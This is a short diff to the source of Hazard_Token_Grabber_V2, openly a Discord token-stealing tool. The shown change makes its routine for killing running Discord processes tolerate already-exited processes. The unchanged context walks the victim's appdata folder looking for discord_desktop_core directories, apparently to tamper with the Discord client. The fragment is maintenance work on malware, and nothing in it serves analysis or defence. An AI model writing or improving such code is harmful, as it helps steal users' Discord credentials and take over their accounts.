@@ -76,7 +76,10 @@ class Hazard_Token_Grabber_V2:
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                proc.kill()
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
